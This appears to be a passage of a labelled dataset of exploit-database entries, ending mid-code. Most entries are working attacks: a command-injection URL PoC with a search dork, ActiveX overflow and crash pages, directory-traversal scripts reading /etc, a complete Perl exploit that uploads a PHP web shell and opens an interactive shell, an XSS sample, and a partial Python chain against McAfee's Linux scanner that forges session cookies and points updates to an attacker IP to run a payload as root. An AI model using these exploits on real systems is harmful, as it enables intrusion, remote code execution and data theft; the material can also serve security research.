6864,"Sepal SPBOARD 4.5 - 'board.cgi' Remote Command Execution  _____   ____   __   __     _       ____        ____    ____  |_   _| |  _ \  \ \ / /    / \     / ___|      / ___|  / ___|   | |   | |_) |  \ V /    / _ \   | |  _      | |     | |       | |   |  _ <    | |    / ___ \  | |_| |  _  | |___  | |___    |_|   |_| \_\   |_|   /_/   \_\  \____| (_)  \____|  \____|                                                               Sepal's SPBOARD v4.5 (board.cgi) Remote Command Execution Vulnerability Script : ): POC :      |---> http://sansuyu.net/cgi-bin/spboard/board.cgi?id=ors1&number=908.cgi&file=|ls -lia|&action=down_file     |---> http://sansuyu.net/cgi-bin/spboard/board.cgi?id=ors1&number=908.cgi&file=|cat board.cgi|&action=down_file     |---> Open By Mozilla Firefox  Dork : http://www.google.com.ly/search?hl=ar&q=SPBOARD+v4.5          ____           _           _           __  __         / ___|   ___   | |       __| |         |  \/  |       | |  _   / _ \  | |      / _` |         | |\/| |       | |_| | | (_) | | |___  | (_| |         | |  | |        \____|  \___/  |_____|  \__,_|  _____  |_|  |_|                                       |_____|           # milw0rm.com [2008-10-29]",Command Execution,1
3866,"Versalsoft HTTP File Uploader - ActiveX 6.36 AddFile Remote Denial of Service <span style=""font: 14pt Courier New;""><p align=""center""><b>2007/05/07</b></p></span> <pre> <code><span style=""font: 10pt Courier New;""><span class=""general1-symbol"">-------------------------------------------------------------------------------------  <b>Versalsoft HTTP File Uploader (UFileUploaderD.dll) 'AddFile' method Buffer Overflow</b>  url: http://en.versalsoft.com/  price: from $59.95 to $799.95   author: shinnai  mail: shinnai[at]autistici[dot]org  site: http://shinnai.altervista.org   Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7  Try only 1500 characters (or less) to see IE crash. -------------------------------------------------------------------------------------  <object classid='clsid:28776DAD-5914-42A7-9139-8FD7C756BBDD' id='target' style=""width: 650px; height: 250px""></object>  <input language=VBScript onclick=tryMe() type=button value=""Click here to start the test""> <input language=VBScript onclick=QuoteMe() type=button value=""Quoting..."">  <script language='vbscript'> Sub tryMe   on error resume next   arg1 = String (4000,""A"")   target.AddFile arg1 End Sub  Sub QuoteMe  Dim MyMsg  MyMsg = MsgBox(""I'm coming down with a fever"" & vbCrLf & _                 ""I'm really out to sea"" & vbCrLf & _                 ""This kettle is boiling over"" & vbCrLf & _                 ""I think I'm a banana tree"", 64, ""2007/05/07 - Versalsoft HTTP File Uploader"") End Sub </script><b><font color=""#FF0000"">As you can see by the faultmon dump, EIP is overwrite so code execution should be possible... but I leave to posterity the hardest part of work :)</font color></b>  11:40:51.172  pid=08E4 tid=0AB0  EXCEPTION (first-chance)               ----------------------------------------------------------------               Exception C0000005 (ACCESS_VIOLATION reading [41414141])               ----------------------------------------------------------------               EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??               EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??               ECX=FFFFFFFF: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??               EDX=0173E650: 00 00 00 00 41 41 41 41-D8 E8 73 01 FA 37 81 7C               ESP=0173E63C: F0 E8 73 01 95 E0 80 7C-50 E6 73 01 41 41 41 41               EBP=0173E658: D8 E8 73 01 FA 37 81 7C-41 41 41 41 A8 42 E7 02               ESI=7FFDABF8: 0A 00 0A 02 00 AC FD 7F-61 00 62 00 6F 00 75 00               EDI=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??               EIP=7C9112B4: F2 AE F7 D1 81 F9 FF FF-00 00 76 05 B9 FF FF 00                             --> REPNZ SCASB               ----------------------------------------------------------------  11:40:51.172  pid=08E4 tid=0AB0  EXCEPTION (first-chance)               ----------------------------------------------------------------               Exception C0000005 (ACCESS_VIOLATION reading [41414141])               ----------------------------------------------------------------               EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??               EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??               ECX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??               EDX=7C9137D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00               ESP=0173E26C: BF 37 91 7C 54 E3 73 01-84 F2 73 01 70 E3 73 01               EBP=0173E28C: 3C E3 73 01 8B 37 91 7C-54 E3 73 01 84 F2 73 01               ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??               EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??               EIP=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??                             --> N/A               ---------------------------------------------------------------- To be continued...</span></span> </code></pre>  # milw0rm.com [2007-05-07]",crash,1
34263,"Video WiFi Transfer 1.01 - Directory Traversal Document Title: =============== Video WiFi Transfer 1.01 - Directory Traversal Vulnerability   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1288   Release Date: ============= 2014-08-02   Vulnerability Laboratory ID (VL-ID): ==================================== 1288   Common Vulnerability Scoring System: ==================================== 6.7   Product & Service Introduction: =============================== Using this app, you can download videos to a PC or a smartphone from your iPhone through WiFi. The video downloaded can be played back  on PC and another smart phones as well as Mac and iPhone because the app converts it into a MP4 video. It only takes a few seconds for  the conversion. You would say it is the fastest. Just run the app on the iPhone and open the web browser on your PC or Android. That is  all that you are required to do. It is quite simple. In addition to the web browser, a ftp client application is also supported to  access the videos. Do not pay money for these functions as the app provides all of them without charging.  (Copy of the Homepage: https://itunes.apple.com/de/app/video-wifi-transfer-mp4-conversion/id892132370 )   Abstract Advisory Information: ============================== The Vulnerability Laboratory Research Team discovered a Directory Traversal vulnerability in the official Bluefinger App Video WiFi Transfer/MP4 Conversion v1.01 iOS mobile application.   Vulnerability Disclosure Timeline: ================================== 2014-08-01: Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== BlueFinger Apps Product: Video WiFi Transfer/MP4 Conversion - iOS Mobile Web Application 1.01   Exploitation Technique: ======================= Remote   Severity Level: =============== High   Technical Details & Description: ================================ A directory traversal web vulnerability has been discovered in the official BlueFinger Apps Video WiFi Transfer v1.01 iOS mobile application. The vulnerability allows remote attackers to bypass the path restriction of a service to access sensitive app-, web-server or -device information.  The vulnerability is located in the `ftp` (ftp://localhost:8080) service of the wifi `web-server` module. The issue allows an attacker to bypass  the regular `folder/path` validation mechnism to access sensitive app web-server or iOS -device information. The attack vector of the issue is on  the application-side of the service and to perform malicious request the `GET method` is required to use.  After the start of the web-server by usage of the ftp function, the attacker is able to include 5 more path values (../../../../../) to access  unauthorized higher folders outside the mobile application service. In the analysis we saw that the path change of 5 directories is required  to bypass. During the tests we accessed the full app service folder and through the directory traversal to web-server configuration files but  also the parent device directory.  The security risk of the directory traversal web vulnerability is estimated as high with a cvss (common vulnerability scoring system)  count of 6.7. Exploitation of the path traversal web vulnerability requires no privileged web-application user account or user interaction.  Successful exploitation of the directory traversal vulnerability results in mobile application or connected device component compromise.  Request Method(s): 			[+] GET  Vulnerable Module(s): 			[+] Directory  Vulnerable Parameter(s): 			[+] path  Affected Module(s): 			[+] Parent Directory (ftp://localhost:8080/)   Note: The structure of the software is the same like in the official BlueFinger Apps `Photo` WiFi Transfer v1.01 iOS mobile application. The same vulnerability is located in both mobile ios software of the bluefinger apps company.   Proof of Concept (PoC): ======================= The directory traversal web vulnerability can be exploited by attackers without privileged application user account and user interaction. For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.  Exception: 50 /private/var/mobile/Applications/CFCEEF6E-AA35-42D6-84EC-BFB518F764B1/Documents/video/../../etc/passwd No such file or directory.  Standard Request: ftp://localhost:8080/../../Documents/  PoC: Links ftp://localhost:8080/../../../../../../../../../../../../../../../../etc ftp://localhost:8080/../../../../../../../../../../../../../../../../usr/ ftp://localhost:8080/../../../../../../../../../../../../../../../../Applications/ ftp://localhost:8080/../../../../../../../../../../../../../../../../System/   Exploit: PoC (PL) #!/usr/bin/perl use LWP::Simple; print ""-------------------------------------------\n""; print ""-= Photo WiFi Transfer v1.0.1 - PoC Directory Traversal=-\n""; print ""-------------------------------------------\n\n"";  print ""Target(ftp://localhost:8080/)\> ""; chomp($targ = <STDIN>);  print ""Path: (/fn25/)\>""; chomp($path=<STDIN>);  $url = ""../../../../../../../../etc/""; $page = get(""http://"".$targ.$path.$url) || die ""[-] Unable to retrieve: $!""; print ""[+] Connected to: $page\n"";   Exploit: PoC (HTML) <html> <head><body><title></title> <iframe src=ftp://localhost:8080/../../../../../../../../../../../../../../../../etc> <iframe src=ftp://localhost:8080/../../../../../../../../../../../../../../../../usr/> <iframe src=ftp://localhost:8080/../../../../../../../../../../../../../../../../Applications/> <iframe src=ftp://localhost:8080/../../../../../../../../../../../../../../../../System/> </body></head> <html>   Exploit: PoC (JS) <script language=JavaScript>m='%3Chtml%3E%0A%3Chead%3E%3Cbody%3E%3Ctitle%3E%3C/title%3E%0A%3Ciframe%20src%3Dftp%3A// localhost%3A8080/../../../../../../../../../../../../../../../../etc%3E%0A%3Ciframe%20src%3Dftp%3A//localhost%3A8080/ ../../../../../../../../../../../../../../../../usr/%3E%0A%3Ciframe%20src%3Dftp%3A//localhost%3A8080/../../../../../ ../../../../../../../../../../../Applications/%3E%0A%3Ciframe%20src%3Dftp%3A//localhost%3A8080/../../../../../../../ ../../../../../../../../../System/%3E%0A%3C/body%3E%3C/head%3E%0A%3Chtml%3E';d=unescape(m);document.write(d);</script>   --- PoC Console Logs --- Applications		14.03.2014 	19:06:00 Developer		18.08.2013 	06:19:00 Library			20.10.2013 	06:32:00 System			17.10.2013 	08:08:00 bin			03.07.2014 	18:13:00 cores			18.08.2013 	05:56:00 Datei:etc	1 KB 	20.10.2013 	06:32:00 private			05.01.2014 	22:18:00 sbin			03.07.2014 	18:13:00 Datei:tmp	1 KB 	20.10.2013 	06:32:00 usr			20.10.2013 	06:23:00 Datei:var	1 KB 	20.10.2013 	06:32:00  300: ftp://localhost:8080/../../../../../../../../ 200: filename content-length last-modified file-type 201: ""Applications"" 0 Sun%2C%2014%20Mar%202014%2019%3A06%3A00 DIRECTORY  201: ""Developer"" 0 Sun%2C%2018%20Aug%202013%2006%3A19%3A00 DIRECTORY  201: ""Library"" 0 Sun%2C%2020%20Oct%202013%2006%3A32%3A00 DIRECTORY  201: ""System"" 0 Sun%2C%2017%20Oct%202013%2008%3A08%3A00 DIRECTORY  201: ""bin"" 0 Sun%2C%2003%20Jul%202014%2018%3A13%3A00 DIRECTORY  201: ""cores"" 0 Sun%2C%2018%20Aug%202013%2005%3A56%3A00 DIRECTORY  201: ""etc"" 11 Sun%2C%2020%20Oct%202013%2006%3A32%3A00 FILE  201: ""private"" 0 Sun%2C%2005%20Jan%202014%2022%3A18%3A00 DIRECTORY  201: ""sbin"" 0 Sun%2C%2003%20Jul%202014%2018%3A13%3A00 DIRECTORY  201: ""tmp"" 15 Sun%2C%2020%20Oct%202013%2006%3A32%3A00 FILE  201: ""usr"" 0 Sun%2C%2020%20Oct%202013%2006%3A23%3A00 DIRECTORY  201: ""var"" 11 Sun%2C%2020%20Oct%202013%2006%3A32%3A00 FILE   Note: The traversal becomes visible after the 5th path/folder request and affects like regular the full app path via web-server. (_eTiGb+6) The issue is the same vulnerability like in the VL-ID 1286. The producer only changed the software name and converter to ensure that  video can be transfered then pictures.   Solution - Fix & Patch: ======================= The directory traversal web vulnerability can be patched by a secure filter and restriction mechanism in the GET method request of the directory/path name value module.   Security Risk: ============== The security risk of the directory traversal web vulnerability in the ftp service of the mobile application is estimated as high.   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either  expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers  are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even  if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation  of liability for consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break  any vendor licenses, policies, deface websites, hack into databases or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com Section:    dev.vulnerability-db.com	 	- forum.vulnerability-db.com 		       		- magazine.vulnerability-db.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to  electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by  Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website  is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact  (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright � 2014 | Vulnerability Laboratory [Evolution Security]    --  VULNERABILITY LABORATORY RESEARCH TEAM DOMAIN: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com","bypass the path restriction of a service to access sensitive app-, web-server or -device information",1
29536,"Microsoft Internet Explorer 5.0.1 - Multiple ActiveX Controls Denial of Service Vulnerabilities source: https://www.securityfocus.com/bid/22288/info  Microsoft Internet Explorer is prone to multiple denial-of-service vulnerabilities because the application fails to handle exceptional conditions.  These issues are triggered when an attacker entices a victim user to visit a malicious website.  Remote attackers may exploit these issues to crash Internet Explorer, effectively denying service to legitimate users.   <html> <body>   <script language=""JavaScript"">     obj = new ActiveXObject(""giffile"");     obj.bgColor;   </script> </body> </html>",denial-of-service,1
7947,"eVision CMS 2.0 - Remote Code Execution #!/usr/bin/perl  # ----------------------------------------------------------------------------- #                      INFORMATIONS # -----------------------------------------------------------------------------  # eVision CMS 2.0 # http://kent.dl.sourceforge.net/sourceforge/e-vision/eVision-2.0.tar.gz # Remote Command Execution Exploit # by Osirys # osirys[at]live[dot]it # Greets to: evilsocket, DarkJoker, emgent, Jay and str0ke  # This cms is vulnerable to arbitrary file upload. The problem is that when # the user uploads a file, on it will be added the .gif extension. but this # cms is vulnerable to Local File Inclusion,so we can include the .gif file # and execute it.  # ------------------------------------------------------------------ # Exploit in action :D # ------------------------------------------------------------------ # osirys[~]>$ perl rcE.txt http://localhost/eVision-2.0/ # #  --------------------------- #    eVision CMS RCE Exploit #        Coded by Osirys #  ---------------------------  # [+] Evil php code uploaded ! # [+] Including now evil file with LFI vulnerability # [+] Injection succesfully ! Remote Command execution works !  # shell[localhost]$> whoami # apache # shell[localhost]$> id # uid=80(apache) gid=80(apache) groups=80(apache) # shell[localhost]$> pwd # /home/osirys/web/eVision-2.0/modules/tour/adminpart # shell[localhost]$> exit # [-] Quitting .. # osirys[~]>$ # ------------------------------------------------------------------  use LWP::UserAgent; use IO::Socket; use HTTP::Request::Common;  my $img_up_path = ""/modules/brandnews/adminpart/img_upload.php""; my $up_path     = ""/modules.conf/brandnews/showpart/icons/""; my $lfi_path    = ""/modules/tour/adminpart/addtour.php?module=""; my $rce_path    = ""../../../modules.conf/brandnews/showpart/icons/""; my $vuln_code   = ""<?php system(\$_GET[cmd]); ?>""; my $lfile       = ""osi.txt""; my $nfile       = ""osirys.txt""; my $host        = $ARGV[0];   ($host) || help(""-1""); cheek($host) == 1 || help(""-2""); &banner;  open ($file, "">>"", $lfile); print $file ""$vuln_code\n""; close($file);  $datas = get_input($host); $datas =~ /(.*) (.*)/; ($h0st,$path) = ($1,$2);   my $url = $host.$img_up_path; my $ua = LWP::UserAgent->new; my $re = $ua->request(POST $url,                                 Content_Type => 'form-data',                                 Content      => [                                                    upload_img => [$lfile, Content_Type => 'text/plain'],                                                    upload_label => $nfile,                                                    upload_submit => 'Upload'                                                 ]                      );  unlink($lfile);  if ($re->is_success){     my $t_re = get_req($host.$up_path.$nfile."".gif"");     if ($t_re =~ /<\?php/) {         print ""[+] Evil php code uploaded !\n"";         print ""[+] Including now evil file with LFI vulnerability\n"";         my $re = get_req($host.$lfi_path.$rce_path.$nfile."".gif%00&cmd=id"");         if ($re =~ /uid/) {             print ""[+] Injection succesfully ! Remote Command execution works !\n\n"";             $lfi_rce = $host.$lfi_path.$rce_path.$nfile."".gif%00&cmd="";             &exec_cmd;         }         else {             print ""[-] Something goes wrong !\n"";             print ""[-] Exploit Failed\n\n"";             exit(0);         }     }     else {         print ""[-] Upload failed\n"";         print ""[-] Exploit Failed\n\n"";         exit(0);     } } else {     print ""[-] Unable to upload evil file !\n"";     print ""[-] Exploit Failed\n\n"";     exit(0); }  sub exec_cmd {     my @outs;     $h0st !~ /www\./ || $h0st =~ s/www\.//;     print ""shell[$h0st]\$> "";     $cmd = <STDIN>;     $cmd !~ /exit/ || die ""[-] Quitting ..\n"";     $exec_url = ($lfi_rce.$cmd);     $re = get_req($exec_url);     if ($re =~ /(.)/) {         push(@outs,$re);         foreach my $o(@outs) {             print ""$o"";         }         &exec_cmd;     }     else {         $c++;         $cmd =~ s/\n//;         print ""bash: "".$cmd."": command not found\n"";         $c < 3 || die ""[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n"";         &exec_cmd;     } }  sub get_req() {     $link = $_[0];     my $req = HTTP::Request->new(GET => $link);     my $ua = LWP::UserAgent->new();     $ua->timeout(4);     my $response = $ua->request($req);     return $response->content; }  sub cheek() {     my $host = $_[0];     if ($host =~ /http:\/\/(.*)/) {         return 1;     }     else {         return 0;     } }  sub get_input() {     my $host = $_[0];     $host =~ /http:\/\/(.*)/;     $s_host = $1;     $s_host =~ /([a-z.-]{1,30})\/(.*)/;     ($h0st,$path) = ($1,$2);     $path =~ s/(.*)/\/$1/;     $full_det = $h0st."" "".$path;     return $full_det; }  sub banner {     print ""\n"".           ""  --------------------------- \n"".           ""    eVision CMS RCE Exploit   \n"".           ""        Coded by Osirys       \n"".           ""  --------------------------- \n\n""; }  sub help() {     my $error = $_[0];     if ($error == -1) {         &banner;         print ""\n[-] Bad hostname! \n"";     }     elsif ($error == -2) {         &banner;         print ""\n[-] Bad hostname address !\n"";     }     print ""[*] Usage : perl $0 http://hostname/cms_path\n\n"";     exit(0); }  # milw0rm.com [2009-02-02]",Command Execution,1
40666,"NVIDIA Driver - Missing Bounds Check in Escape 0x70000d5 Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=944  The DxgkDdiEscape handler for 0x70000d5 lacks bounds checks:    ...    if ( g_saved_size )   {     escape->size = g_saved_size;     if ( (unsigned int)g_saved_size > 0 )     {       do       {         v5 = v2++;         escape->data[v5] = global_array[v5 + 77];       }       while ( v2 < g_saved_size );     }     return;   }   data = 0i64;     ...   if ( escape->size > 0 )   {     do     {       ii = i++;       global_array[ii + 77] = escape->data[ii];     }     while ( i < escape->size );    ...   g_saved_size = escape->size;  This handler copies data to/from a global array, but lacks any form of bounds checking, as |escape->size| is controlled by the user. This leads to overflow of the global buffer, and pool overflows when it's copied back into the escape data.  A PoC is attached that should cause a crash (Win 10 x64, 372.54):  KERNEL_SECURITY_CHECK_FAILURE (139) A kernel component has corrupted a critical data structure.  The corruption could potentially allow a malicious user to gain control of this machine. Arguments: Arg1: 0000000000000002, Stack cookie instrumentation code detected a stack-based 	buffer overrun. Arg2: ffffd00022de52c0, Address of the trap frame for the exception that caused the bugcheck Arg3: ffffd00022de5218, Address of the exception record for the exception that caused the bugcheck Arg4: 0000000000000000, Reserved   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40666.zip",crash,1
33219,"Planet 2.0 - HTML Injection source: https://www.securityfocus.com/bid/36392/info  Planet is prone to an HTML-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.  Attacker-supplied HTML and script code would run in the context of the affected website, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user.  Planet 2.0 is affected; other versions may also be vulnerable.  The following example code is available:  <img src=""javascript:alert(1);"" >",the application fails to properly sanitize user-supplied input before using it in dynamically generated content,0
40911,"McAfee Virus Scan Enterprise for Linux 1.9.2 < 2.0.2 - Remote Code Execution ''' Source: https://nation.state.actor/mcafee.html  Vulnerabilities  CVE-2016-8016: Remote Unauthenticated File Existence Test CVE-2016-8017: Remote Unauthenticated File Read (with Constraints) CVE-2016-8018: No Cross-Site Request Forgery Tokens CVE-2016-8019: Cross Site Scripting CVE-2016-8020: Authenticated Remote Code Execution & Privilege Escalation CVE-2016-8021: Web Interface Allows Arbitrary File Write to Known Location CVE-2016-8022: Remote Use of Authentication Tokens CVE-2016-8023: Brute Force Authentication Tokens CVE-2016-8024: HTTP Response Splitting CVE-2016-8025: Authenticated SQL Injection When chaned together, these vulnerabilities allow a remote attacker to execute code as root. ''' #!/bin/python3 import time import requests import os import sys import re import threading import subprocess from http.server import BaseHTTPRequestHandler, HTTPServer from socketserver import ThreadingMixIn  # Per-target configuration target_domain=""https://10.0.1.130"" # https://target_ip local_ip = '10.0.1.128'                 # Attacker IP for victim to connect back to authorized_ip=""127.0.0.1""           # IP address cookie will be valid for update_server_port = 8080               # Port update server listens on delay_seconds = 10                      # How long should the server take to serve the update target_port = 55443                 # Port to target  # Put payload script in payload.sh  # Initialization payload_in_place = threading.Event() requests.packages.urllib3.disable_warnings() with open(""payload.sh"", ""r"") as f:     payload = f.read()  def pprint(inp, flag=False):     pad = ""#""     if flag:         pad = ""*""     print(""\n"" + pad+ "" "" + inp)   def crack_cookie():     pprint(""Cracking Cookie"")      # A page that requires authentication     url = target_domain + "":"" + str(target_port) + ""/0409/nails?pg=proxy&tplt=productUpdate.html""      # Start at the current time + 100 in case of recent login with clock skew     date_val = int(time.time()+100)     cookie_fmt = authorized_ip+""/n/0/%d-checksum// ""+authorized_ip + "" ""*20      # Make requests, print after every 600     while True:         cookie = cookie_fmt % date_val         req_cookie = {""nailsSessionId"": cookie}         r = requests.get(url, cookies=req_cookie, verify=False)         r.raise_for_status()          if ""Set-Cookie"" in r.headers:             valid_cookie = cookie             timestamp = cookie.split(""/"")[3].split(""-"")[0]             break          elif date_val % 600 == 0:             print(""Now trying  %s"" % time.asctime(time.localtime(date_val)))          date_val -= 1      pprint(""Cookie Cracked: "" + timestamp, True)     return valid_cookie   def update_update_server(auth_cookie):     pprint(""Updating update server"")      # Replace McAfeeHttp update server with attacker local_ip:update_server_port     url = target_domain + "":"" + str(target_port) + ""/0409/nails?pg=proxy&addr=127.0.0.1%3A65443&tplt="" \     ""repository.html&sitelist=add&mon%3A0=db+set+1+_table%3Drepository+status%3D1+siteList%3D%253C%253F"" \     ""xml%2520version%253D%25221.0%2522%2520encoding%253D%2522UTF-8%2522%253F%253E%250A%253Cns%253ASiteLists"" \     ""%2520xmlns%253Ans%253D%2522naSiteList%2522%2520GlobalVersion%253D%2522PATTeELCQSEhZwxKf4PoXNSY4%2Fg%25"" \     ""3D%2522%2520LocalVersion%253D%2522Wed%252C%252030%2520Dec%25202009%252011%253A20%253A59%2520UTC%2522%2"" \     ""520Type%253D%2522Client%2522%253E%253CPolicies%2F%253E%253CSiteList%2520Default%253D%25221%2522%2520Na"" \     ""me%253D%2522SomeGUID%2522%253E%253CHttpSite%2520Type%253D%2522repository%2522%2520Name%253D%2522McAfee"" \     ""Http%2522%2520Order%253D%25221%2522%2520Server%253D%2522""+local_ip+""%253A""+str(update_server_port) \     + ""%2522%2520Enabled%253D%25221%2522%2520Local%253D%25221%2522%253E%253CRelativePath%2F%253E%253CUseAuth%"" \     ""253E0%253C%2FUseAuth%253E%253CUserName%253E%253C%2FUserName%253E%253CPassword%2520Encrypted%253D%25220"" \     ""%2522%2F%253E%253C%2FHttpSite%253E%253CFTPSite%2520Type%253D%2522fallback%2522%2520Name%253D%2522McAfe"" \     ""eFtp%2522%2520Order%253D%25222%2522%2520Server%253D%2522ftp.nai.com%253A21%2522%2520Enabled%253D%25221"" \     ""%2522%2520Local%253D%25221%2522%253E%253CRelativePath%253ECommonUpdater%253C%2FRelativePath%253E%253CU"" \     ""seAuth%253E1%253C%2FUseAuth%253E%253CUserName%253Eanonymous%253C%2FUserName%253E%253CPassword%2520Encr"" \     ""ypted%253D%25221%2522%253ECommonUpdater%40McAfeeB2B.com%253C%2FPassword%253E%253C%2FFTPSite%253E%253C%"" \     ""2FSiteList%253E%253C%2Fns%253ASiteLists%253E+_cmd%3Dupdate+&mon%3A1=task+setsitelist&mon%3A2=db+select"" \     ""+_show%3DsiteList+_show%3Dstatus+_table%3Drepository&info%3A2=multi%2Cshow&reposProperty=repository&re"" \     ""posProperty=fallback&useOfProxy=on""      r = requests.get(url, cookies=auth_cookie, verify=False)     r.raise_for_status()     pprint(""Updated update server"", True)  def download_update(req_cookie):     pprint(""Requesting target download payload"")      # Send request to make target download payload     url = target_domain + "":"" + str(target_port) + ""/0409/nails""      updateName = ""update_%d"" % int(time.time())     postdata = (""pg=proxy&addr=127.0.0.1%3A65443&tplt=scheduledTasks.html&scheduleOp=add&mon%3A0=db+set+1+_tab"" \     ""le%3Dschedule++taskName%3D{0}+taskType%3DUpdate+taskInfo%3DtoUpdate%3Ddat%253Bengine+timetable%3Dtype%"" \     ""3Dunscheduled+status%3DIdle++i_recurrenceCounter%3D0+&mon%3A1=task+nstart+{0}&mon%3A2=db+select+_asc%3D"" \     ""taskName+_table%3Dschedule+_show%3Di_taskId+_show%3DtaskName+_show%3DtaskResults+_show%3Dtimetable+_sh"" \     ""ow%3DtaskType+_show%3DtaskInfo+_show%3Di_lastRun+_show%3D%24i_lastRun+_show%3Dstatus+_show%3Dprogress+"" \     ""_show%3Di_nextRun+_show%3D%24i_nextRun+_show%3Di_duration+_show%3DtaskInfo++_limit%3D50+_offset%3D0&in"" \     ""fo%3A2=multi%2Cshow&mon%3A3=db+select+_table%3Dschedule+_show%3Dcount%28*%29&info%3A3=multi%2Cshow&loc"" \     ""%3A4=conf+get+browser.resultsPerPage&info%3A4=multi%2Cshow&mon%3A5=task+updatecrontab&info%3A5=multi%2"" \     ""Cshow&echo%3A6=1&info%3A6=pageNo&echo%3A7=&info%3A7=selectedTask"""""").format(updateName)      headers = {'Content-Type': 'application/x-www-form-urlencoded'}     r = requests.post(url, data=postdata, cookies=req_cookie, verify=False, headers=headers)     r.raise_for_status()      pprint(""Payload download requested"", 1)   def exec_catalogz(req_cookie):     pprint(""Making target execute payload"")      #### Get commit_id and ODS_name     url = target_domain + "":"" + str(target_port) + ""/0409/nails?pg=proxy&tplt=schedOnDemand.html&addr=127.0"" \     "".0.1:65443&mon:0=sconf+ODS+select+section%3Dnailsd.profile.ODS&info:0=multi,show,digest&echo:1=ODS&inf"" \     ""o:1=profileName&mon:2=sconf+ODS+select+section%3Dnailsd.profile.ODS_default&info:2=multi,show&echo:3=O"" \     ""DS_default&info:3=defaultProfileName&mon:4=sconf+ODS+select+attribute%3Dnailsd.oasEnabled&info:4=multi"" \     "",show&mon:5=extensions&info:5=multi,show&mon:6=db+select+_show=max(i_taskId)+_table=schedule&info:6=mu"" \     ""lti,show&mon:7=utco&info:7=single,show,serverUtcOffset&echo:8=generate&info:8=profileNameAction""      r = requests.get(url, cookies=req_cookie, verify=False)     r.raise_for_status()      regex = re.search(""\|digest=(.+?)\|"", r.text)     if not regex:         print(""\nERROR: Could not get commit_id when generating evil scan\n"")         return False      commit_id = regex.groups(1)[0]      # Send request to start evil scan     payload_path = ""%2Fopt%2FMcAfee%2Fcma%2Fscratch%2Fupdate%2Fcatalog.z""     binary_path = ""%2Fbin%2Fsh"" # Use ""%2fbin%2Fstatic-sh"" for versions 1.x      url = target_domain + "":"" + str(target_port) + ""/0409/nails""      ODS_name = ""ODS_1""   # This may need to be increased if the name already exists     scan_name = ""scan_%s"" % str(int(time.time()))      postdata =  (""pg=proxy&addr=127.0.0.1%3A65443&tplt=scheduledTasks.html&mon%3A0=sconf+{1}+begin&info%3A0="" \     ""multi%2Cshow&mon%3A1=sconf+{1}+delete+{0}+section%3Dnailsd.profile.{1}.filter+section%3Dnailsd.prof"" \     ""ile.{1}.action&mon%3A2=sconf+{1}+set+{0}+nailsd.profile.{1}.allFiles%3Dtrue+nailsd.profile.{1}.child"" \     ""InitTmo%3D240+nailsd.profile.{1}.cleanChildren%3D2+nailsd.profile.{1}.cleansPerChild%3D10000+nailsd"" \     "".profile.{1}.datPath%3D%2Fopt%2FNAI%2FLinuxShield%2Fengine%2Fdat+nailsd.profile.{1}.decompArchive%3"" \     ""Dtrue+nailsd.profile.{1}.decompExe%3Dtrue+nailsd.profile.{1}.engineLibDir%3D%2Fopt%2FNAI%2FLinuxShi"" \     ""eld%2Fengine%2Flib+nailsd.profile.{1}.enginePath%3D{3}+nailsd.profile.{1}.factoryI"" \     ""nitTmo%3D240+nailsd.profile.{1}.heuristicAnalysis%3Dtrue+nailsd.profile.{1}.macroAnalysis%3Dtrue+na"" \     ""ilsd.profile.{1}.maxQueSize%3D32+nailsd.profile.{1}.mime%3Dtrue+nailsd.profile.{1}.noJokes%3Dfalse+"" \     ""nailsd.profile.{1}.program%3Dtrue+nailsd.profile.{1}.quarantineChildren%3D1+nailsd.profile.{1}.quar"" \     